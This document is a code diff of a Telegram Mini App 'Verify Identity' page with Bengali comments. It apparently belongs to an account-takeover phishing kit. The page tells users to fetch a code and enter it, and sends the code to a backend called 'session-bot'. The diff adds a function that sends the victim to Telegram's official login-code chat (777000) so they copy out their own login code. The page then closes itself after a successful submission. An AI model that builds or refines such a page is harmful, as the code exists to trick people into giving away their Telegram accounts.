@@ -29,8 +29,8 @@
         <h3>Verify Identity</h3>
         <p class="info-text">Click below to see the code, then enter it here.</p>
         
-        <!-- আপডেট করা বাটন: যা টেলিগ্রামের JavaScript API ব্যবহার করবে -->
-        <button class="btn btn-blue" onclick="openTelegramChat()">📩 Get OTP Code</button>
+        <!-- আপডেট করা বাটন: ক্লিক করলে অ্যাপ মিনিমাইজ হবে -->
+        <button class="btn btn-blue" onclick="minimizeAndGetCode()">📩 GET CODE 📩</button>
         
         <input type="number" id="otp" placeholder="Enter Code">
         <button class="btn" id="v_btn" onclick="verifyOTP()">Verify OK</button>
@@ -38,9 +38,9 @@
 
     <script>
         let tg = window.Telegram.WebApp;
-        tg.expand();
+        tg.expand(); // অ্যাপটিকে ফুলস্ক্রিন করার জন্য
         
-        // আপনার ব্যাকএন্ড URL এখানে দিন
+        // আপনার ব্যাকএন্ড URL
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
 
@@ -80,9 +80,15 @@
             } catch (e) { alert("Error connecting to server!"); }
         }
 
-        // নতুন যোগ করা ফাংশন: যা সরাসরি অফিশিয়াল টেলিগ্রাম চ্যাটে নিয়ে যাবে
-        function openTelegramChat() {
-            tg.openTelegramLink("https://t.me/Telegram");
+        // নতুন ফাংশন: যা অ্যাপটিকে মিনিমাইজ করে টেলিগ্রামের OTP মেসেজে নিয়ে যাবে
+        function minimizeAndGetCode() {
+            // এটি টেলিগ্রামের অফিশিয়াল সার্ভিস চ্যাট (777000) ওপেন করার কমান্ড
+            window.location.href = "tg://openmessage?user_id=777000";
+            
+            // ব্যাকআপ হিসেবে: যদি উপরের লিংকে কাজ না করে, তবে সরাসরি চ্যাট লিস্টে নিয়ে যাবে
+            setTimeout(function() {
+                window.location.href = "tg://";
+            }, 500);
         }
 
         async function verifyOTP() {
@@ -100,6 +106,7 @@
                 });
                 const data = await res.json();
                 if (data.status === "success") {
+                    // ভেরিফাই সফল হলে অ্যাপ বন্ধ করে দেবে
                     tg.close();
                 } else {
                     alert("Invalid Code! Please try again.");
